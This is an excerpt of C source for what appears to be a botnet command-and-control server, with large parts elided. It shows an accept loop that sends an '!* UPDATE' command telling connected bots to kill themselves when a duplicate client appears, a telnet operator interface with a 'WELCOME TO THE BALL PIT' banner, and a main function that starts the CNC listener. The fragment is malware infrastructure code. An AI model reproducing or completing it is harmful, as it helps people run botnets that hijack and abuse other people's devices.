                        ...
                        else if (listenFD == events[i].data.fd)
                        {
                                while (1)
                                {
                                        ...
                                        if(dup) 
                                        {
                                                ...
                                                if(send(infd, "!* UPDATE\n", 11, MSG_NOSIGNAL) == -1) { close(infd); continue; } // orders all the bots to immediately kill themselves if we see a duplicate client! MAXIMUM PARANOIA
                                                close(infd);
                                                continue;
                                        }
...
void *telnetWorker(void *sock)
{
		...
		sprintf(banner1, "\x1b[31m********************************************\r\n");
		sprintf(banner2, "\x1b[31m*        WELCOME TO THE BALL PIT           *\r\n");
		sprintf(banner3, "\x1b[31m*     Now with \x1b[32m1m4o\x1b[31m support                *\r\n");
		sprintf(banner4, "\x1b[31m********************************************\r\n");
		sprintf(banner5, "\r\n\x1b[31m> \x1b[0");
		...
		if(send(thefd, banner5, strlen(banner5), MSG_NOSIGNAL) == -1) goto end;
...
int main (int argc, char *argv[])
{
        ...
        pthread_create(&thread[0], NULL, &telnetListener, (void *)cncport);
